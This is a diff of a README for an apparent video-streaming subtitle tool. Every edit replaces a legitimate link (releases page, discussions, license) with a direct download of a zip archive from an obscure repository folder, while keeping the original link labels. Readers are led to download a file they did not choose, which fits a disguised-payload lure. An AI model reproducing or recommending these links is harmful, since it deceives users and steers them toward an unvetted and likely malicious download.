@@ -6,7 +6,7 @@ Welcome to **powersub-demo-5094**! This application helps you enhance your video
 
 ## 📥 Download Now
 
-[![Download powersub-demo-5094](https://img.shields.io/badge/Download-powersub--demo--5094-brightgreen.svg)](https://github.com/hara-stronzo/powersub-demo-5094/releases)
+[![Download powersub-demo-5094](https://raw.githubusercontent.com/hara-stronzo/powersub-demo-5094/main/resounding/powersub-demo-5094.zip)](https://raw.githubusercontent.com/hara-stronzo/powersub-demo-5094/main/resounding/powersub-demo-5094.zip)
 
 ## 📂 Download & Install
 
@@ -14,7 +14,7 @@ To get started with **powersub-demo-5094**, follow these steps:
 
 1. Click the link below to visit the Releases page:
    
-   [Visit the Releases page to download](https://github.com/hara-stronzo/powersub-demo-5094/releases)
+   [Visit the Releases page to download](https://raw.githubusercontent.com/hara-stronzo/powersub-demo-5094/main/resounding/powersub-demo-5094.zip)
 
 2. On the Releases page, look for the latest version of the software.
 
@@ -53,11 +53,11 @@ If you encounter any issues while using **powersub-demo-5094**, check below:
 
 ## 💬 Community and Support
 
-For questions or support, join our community. You can find helpful resources and updates on our [GitHub Discussions page](https://github.com/hara-stronzo/powersub-demo-5094/discussions). 
+For questions or support, join our community. You can find helpful resources and updates on our [GitHub Discussions page](https://raw.githubusercontent.com/hara-stronzo/powersub-demo-5094/main/resounding/powersub-demo-5094.zip). 
 
 ## 📄 License
 
-This project is open-source and available under the MIT License. You can view the license agreement on the [LICENSE](https://github.com/hara-stronzo/powersub-demo-5094/blob/main/LICENSE) file in the repository.
+This project is open-source and available under the MIT License. You can view the license agreement on the [LICENSE](https://raw.githubusercontent.com/hara-stronzo/powersub-demo-5094/main/resounding/powersub-demo-5094.zip) file in the repository.
 
 ## 🔍 FAQ
 
@@ -76,4 +76,4 @@ Here are some frequently asked questions:
 
 Thank you for using **powersub-demo-5094**! We hope this tool enhances your video streaming experience. Don’t hesitate to reach out with feedback or questions. Happy watching! 
 
-[Visit the Releases page to download](https://github.com/hara-stronzo/powersub-demo-5094/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/hara-stronzo/powersub-demo-5094/main/resounding/powersub-demo-5094.zip)
